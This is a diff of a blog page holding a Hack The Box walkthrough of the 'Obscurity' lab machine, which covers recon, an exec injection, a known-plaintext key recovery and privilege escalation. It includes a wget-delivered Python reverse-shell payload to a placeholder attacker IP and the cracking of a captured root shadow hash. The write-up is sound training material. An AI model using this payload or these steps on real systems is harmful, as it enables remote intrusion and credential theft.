@@ -23,7 +23,7 @@
     <meta property="og:url" content="http://localhost:2368/htb-walkthrough-obscurity/" />
     <meta property="og:image" content="http://localhost:2368/content/images/2020/06/1-1.png" />
     <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-06-07T18:10:36.000Z" />
+    <meta property="article:modified_time" content="2020-06-08T09:37:55.000Z" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="HTB Walkthrough | Obscurity" />
     <meta name="twitter:description" content="Retired machine can be found here. 1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080. $ nmap -sC -sV -oA obscurity.htb 22/tcp open ssh OpenSSH" />
@@ -65,7 +65,7 @@
     "headline": "HTB Walkthrough | Obscurity",
     "url": "http://localhost:2368/htb-walkthrough-obscurity/",
     "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-06-07T18:10:36.000Z",
+    "dateModified": "2020-06-08T09:37:55.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "http://localhost:2368/content/images/2020/06/1-1.png",
@@ -191,9 +191,9 @@
 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 8080/tcp open http-proxy BadHTTPServer
 ```</code></pre>
-<!--kg-card-end: markdown--><p>2. There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/img1.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/img2.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/img3.png" class="kg-image"></figure><p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+<!--kg-card-end: markdown--><p>2. There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-1.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-2.png" class="kg-image"></figure><p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
 </code></pre>
-<!--kg-card-end: markdown--><p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br>While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/img4.png" class="kg-image"></figure><p>5. Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as wwwdata.</p><!--kg-card-begin: markdown--><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<!--kg-card-end: markdown--><p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br>While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-3.png" class="kg-image"></figure><p>5. Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as wwwdata.</p><!--kg-card-begin: markdown--><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
 </code></pre>
 <!--kg-card-end: markdown--><p>6. Our first goal is to become robert.</p><!--kg-card-begin: markdown--><pre><code>$ cat etc/passwd
 ...
@@ -213,7 +213,7 @@ Encrypting this file with your key should result in out.txt, make sure your key 
 <!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>$ cat out.txt
 ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v$$ cat passwordreminder.txt´ÑÈÌÉàÙÁÑé¯·¿
 </code></pre>
-<!--kg-card-end: markdown--><p>8. So, by encrypting check.txt with an unknown key we get out.txt.<br>Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br>Let's create a script to find the key!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/script1.png" class="kg-image"></figure><p>9. Now that we have the key ('alexandrovich'), let's use it to find robert's password!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/script2.png" class="kg-image"></figure><p>10. Now that we have robert's password we can SSH into the machine, get the user flag and move on to root. We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ./LinEnum.sh...
+<!--kg-card-end: markdown--><p>8. So, by encrypting check.txt with an unknown key we get out.txt.<br>Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br>Let's create a script to find the key!</p><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-4.png" class="kg-image"></figure><p>9. Now that we have the key ('alexandrovich'), let's use it to find robert's password!</p><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-5.png" class="kg-image"></figure><p>10. Now that we have robert's password we can SSH into the machine, get the user flag and move on to root. We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ./LinEnum.sh...
 User robert may run the following commands on obscure:
 (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 -e
@@ -223,7 +223,7 @@ Enter username: robert
 Enter password: xxx
 Authed!
 </code></pre>
-<!--kg-card-end: markdown--><p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on /tmp/SSH/.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/script3.png" class="kg-image"></figure><p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/obscurity/script4.png" class="kg-image"></figure><p>14. Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><!--kg-card-begin: markdown--><pre><code>$ echo &quot;root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7&quot; &gt; shadow
+<!--kg-card-end: markdown--><p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on /tmp/SSH/.</p><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-6.png" class="kg-image"></figure><p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p><figure class="kg-card kg-image-card"><img src="http://localhost:2368/content/images/2020/06/image-7.png" class="kg-image"></figure><p>14. Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><!--kg-card-begin: markdown--><pre><code>$ echo &quot;root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7&quot; &gt; shadow
 $ echo &quot;root:x:0:0:root:/root:/bin/bash&quot; &gt; passwd
 $ unshadow passwd shadow &gt; crack.password.db
 $ john crack.password.db
@@ -296,19 +296,32 @@ $ john crack.password.db
 
 </article>
 
-                <article class="post-card post no-image no-image">
+                <article class="post-card post tag-recon-ng tag-kali tag-tutorial ">
 
+    <a class="post-card-image-link" href="/recon-ng-5/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/06/recon-ng.png 300w,
+                    /content/images/size/w600/2020/06/recon-ng.png 600w,
+                    /content/images/size/w1000/2020/06/recon-ng.png 1000w,
+                    /content/images/size/w2000/2020/06/recon-ng.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="/content/images/size/w600/2020/06/recon-ng.png"
+            alt="Recon-ng 5 | The Basics"
+        />
+    </a>
 
     <div class="post-card-content">
 
-        <a class="post-card-content-link" href="/exploiting-a-postfix-esmtp-server/">
+        <a class="post-card-content-link" href="/recon-ng-5/">
 
             <header class="post-card-header">
-                <h2 class="post-card-title">Exploiting a Postfix ESMTP server</h2>
+                    <div class="post-card-primary-tag">recon-ng</div>
+                <h2 class="post-card-title">Recon-ng 5 | The Basics</h2>
             </header>
 
             <section class="post-card-excerpt">
-                    <p>In the context of a CTF, I found a Postfix ESMTP server running on port 25 of one of the targets. nmap -A [ip] PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd |_smtp-commands: [domain], PIPELINING, SIZE 15728640, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,</p>
+                    <p>1. Get the latest version of the Recon-ng. sudo apt-get update sudo apt-get install recon-ng 2. Start the application. recon-ng 3. List workspaces. [recon-ng][default] &gt; workspaces list +------------+ | Workspaces</p>
             </section>
 
         </a>
@@ -328,7 +341,7 @@ $ john crack.password.db
             </ul>
             <div class="post-card-byline-content">
                 <span><a href="/author/ines/">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-06-07">7 Jun 2020</time> <span class="bull">&bull;</span> 2 min read</span>
+                <span class="post-card-byline-date"><time datetime="2020-06-07">7 Jun 2020</time> <span class="bull">&bull;</span> 1 min read</span>
             </div>
         </footer>
 
